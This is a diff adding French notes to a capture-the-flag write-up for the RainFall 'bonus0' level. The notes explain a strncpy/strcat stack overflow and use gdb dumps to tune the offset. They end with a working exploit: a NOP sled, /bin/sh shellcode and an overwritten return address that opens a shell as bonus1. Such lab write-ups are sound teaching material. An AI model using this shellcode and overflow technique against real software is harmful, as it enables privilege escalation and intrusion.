@@ -9,3 +9,124 @@ $
 Ici addresse comprise avant le shellcode, pour qu'il aille ensuite dessus
 
 jump at least 54 before shellcode : because it is replaced with second buffer
+
+Observons le comportement du binaire
+
+bonus0@RainFall:~$ ./bonus0
+ -
+Hello
+ -
+World
+Hello World
+bonus0@RainFall:~$
+
+Le binaire attend deux saisies utilisateurs, et les concatène grâce à un strcat.
+
+La saisie utilisateur se fait dans la fonction p.
+
+Un read dans un buffer de 4096 suivi d'un strncpy de 20 caractères.
+
+Ensuite la fonction pp copie d'abord la première saisie utilisateur dans le buffer du main.
+
+y concatène " \0" puis la seconde saisie utilisateur.
+
+strncpy vient avec une faille : ne pas mettre de '\0' si la taille de l'argument est >= n (nombre de caractère copié par strncpy)
+
+Notre première saisie sera tronquée à 20 et sans '\0' si plus de 20 caractères entrés.
+
+
+Ensuite lors du strcpy, la copie va se faire jusqu'à trouver un '\0'
+
+Si on remplit le premier strncpy
+
+Le strcpy va copier ce qui suit dans la mémoire le premier buffer envoyé à p jusqu'à tomber sur un '\0'.
+
+Ce qui suit le premier buffer est le second envoyé à p.
+
+On peut donc avoir un premier argument de strcat de la forme : A * 20 + B * 19
+
+le buffer concaténé par strcat va ensuite avoir une longueur de 39 + 1 + 19 : 58
+
+Dans gdb on obtient le segfault suivant :
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+On a overwrite l'eip.
+
+Le buffer du read est grand.
+
+On peut y mettre un shellcode après de nombreux "NOP"
+
+et overwrite l'eip avec une adresse dans ce NOP sled
+
+Pour trouver une adresse dans le NOP sled, procédons avec gdb :
+
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 3, 0x080484f4 in p ()
+(gdb) x/44wx $ebp -0x1008
+0xbfffe650:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+(gdb)
+
+On utilisera : 0xbfffe6f0 => \xf0\xe6\xff\xbf
+
+Essayons la payload suivante :
+
+(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 15 + "\xf0\xe6\xff\xbf"'; cat) | ./bonus0
+
+On obtient un segfault
+
+Avec cette même payload dans gdb, en breakant avant le ret du main (+38)
+On obtient saved eip 0xffe6f042
+
+Il semblerait qu'on n'ait écrit que partiellement sur l'eip
+
+Avec des C à la place des B on obtient saved eip 0xffe6f043
+
+On retire un B : 
+(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 14 + "\xf0\xe6\xff\xbf"'; cat) | ./bonus0
+saved eip 0xbfffe6
+
+(gdb) x/20wx $esp
+0xbffff6c0:	0xbffff6d6	0x080498d8	0x00000001	0x0804835d
+0xbffff6d0:	0xb7fd13e4	0x90900016	0x90909090	0x90909090
+0xbffff6e0:	0x90909090	0x90909090	0x43439090	0x43434343
+0xbffff6f0:	0x43434343	0x43434343	0xbfffe6f0	0x43434320
+0xbffff700:	0x43434343	0x43434343	0xf0434343	0x00bfffe6
+
+l'eip est toujours décalé de 1, notre buffer est de taille 18, on ajoute un caractère après l'adresse:
+(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 14 + "\xf0\xe6\xff\xbf" + "C"'; cat) | ./bonus0
+
+On a la bonne eip : 
+
+(gdb) info frame
+Stack level 0, frame at 0xbffff710:
+ eip = 0x80485ca in main; saved eip 0xbfffe6f0
+
+Un shell s'ouvre dans gdb
+
+Essayons cette payload dans le terminal pour obtenir les droit du bonus1
+
+bonus0@RainFall:~$ (python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 14 + "\xf0\xe6\xff\xbf" + "C"'; cat) | ./bonus0
+ -
+ -
+��������������������BBBBBBBBBBBBBB����C BBBBBBBBBBBBBB����C
+$ whoami
+bonus1
+$
